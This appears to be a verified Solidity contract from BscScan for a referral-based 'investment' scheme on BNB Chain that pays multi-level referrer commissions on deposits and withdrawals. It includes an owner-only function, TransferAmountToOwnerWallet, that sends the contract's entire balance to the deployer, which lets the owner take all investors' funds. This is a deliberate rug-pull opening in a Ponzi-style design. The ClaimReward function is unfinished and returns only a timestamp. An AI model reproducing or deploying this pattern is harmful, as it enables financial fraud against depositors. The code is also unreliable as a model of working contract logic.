/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

contract Matic {
    uint256 IdProvider = 4000;
    address owner;

    uint256[] public InvestmentPercentage = [
        100,
        50,
        40,
        30,
        20,
        10,
        10,
        10,
        10,
        5,
        5,
        5,
        5
    ];
    uint256[] public WithdrawPercentage = [
        150,
        100,
        80,
        60,
        30,
        30,
        30,
        30,
        30,
        30,
        70,
        80,
        80
    ];
    uint32 PercentDivider = 1000;
    struct userDetail {
        uint256 userID;
        address Useraddress;
        address UserrefferedBy;
        uint256 UserTotalWthdrwal;
        uint256 userLastWithdrwal;
        uint256 userTotalInvestment;
        uint256 userlastTimeInvestment;
        uint256 userRemainingInvestment;
        uint256 [][]userAllPurchased;
    }

    mapping(address => userDetail) public UserAllDetailByAddress;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function Invest(uint256 _amount, address _ReferdBy) public payable {
        require(msg.value >= _amount, "Amount Transfer Issues Please check Issue");
        if (_ReferdBy == address(0)) {
            _ReferdBy = owner;  
        }
        if (UserAllDetailByAddress[msg.sender].userID != 0) {
            UserAllDetailByAddress[msg.sender].userID = UserAllDetailByAddress[
                msg.sender
            ].userID;
        } else {
            UserAllDetailByAddress[msg.sender].userID = IdProvider;
            IdProvider++;
        }

        UserAllDetailByAddress[msg.sender].Useraddress = msg.sender;
        UserAllDetailByAddress[msg.sender].UserrefferedBy = _ReferdBy;
        UserAllDetailByAddress[msg.sender].userTotalInvestment += _amount;
        UserAllDetailByAddress[msg.sender].userlastTimeInvestment = _amount;
        UserAllDetailByAddress[msg.sender].userRemainingInvestment += _amount;
        UserAllDetailByAddress[msg.sender].userAllPurchased.push([_amount,block.timestamp]);

        address _referrer = UserAllDetailByAddress[msg.sender].UserrefferedBy;
        for (uint8 i = 0; i < 5; i++) {
            if (_referrer != address(0)) {
                payable(_referrer).transfer(
                    (_amount * InvestmentPercentage[i]) / PercentDivider
                );
                if (
                    UserAllDetailByAddress[_referrer].UserrefferedBy !=
                    address(0)
                ) _referrer = UserAllDetailByAddress[_referrer].UserrefferedBy;
                // else break;
            }
        }
    }

    function withdrawAmount(uint256 _amount) public {

        require(_amount <=  UserAllDetailByAddress[msg.sender].userRemainingInvestment,"insufficient Balance To withdraw ");

        uint256 Amount;

        uint256 bal  =  (_amount*80/100);
        payable(msg.sender).transfer(bal);

        uint256 refBalance = _amount-bal;
                 Amount =refBalance;   
                refBalance = (refBalance*80)/100;


        address _referrer = UserAllDetailByAddress[msg.sender].UserrefferedBy;
        for (uint8 i = 0; i < 5; i++) {
            if (_referrer != address(0)) {
                payable(_referrer).transfer(
                    (refBalance * WithdrawPercentage[i]) / PercentDivider
                );
                if (
                    UserAllDetailByAddress[_referrer].UserrefferedBy != address(0)
                ) _referrer = UserAllDetailByAddress[_referrer].UserrefferedBy;
                // else break;
            }
        }


                        uint256 adminwallet =  (Amount*20/100);
                            payable(owner).transfer(adminwallet);


        UserAllDetailByAddress[msg.sender].userLastWithdrwal = _amount;
        UserAllDetailByAddress[msg.sender].UserTotalWthdrwal += _amount;
        UserAllDetailByAddress[msg.sender].userRemainingInvestment  =  UserAllDetailByAddress[msg.sender].userRemainingInvestment - _amount;

    }


        function ClaimReward() public view returns(uint256) {

                   return UserAllDetailByAddress[msg.sender].userAllPurchased[0][1];

                // for(uint8 i=1 ;i<=UserAllDetailByAddress[msg.sender].userAllPurchased.length;i++){

                // if( UserAllDetailByAddress[msg.sender].userAllPurchased[1][2]){

                // }
                // }


        }





        
        function TransferAmountToOwnerWallet() public onlyOwner payable {
              payable(msg.sender).transfer(address(this).balance);
        }




    receive() external payable {}
}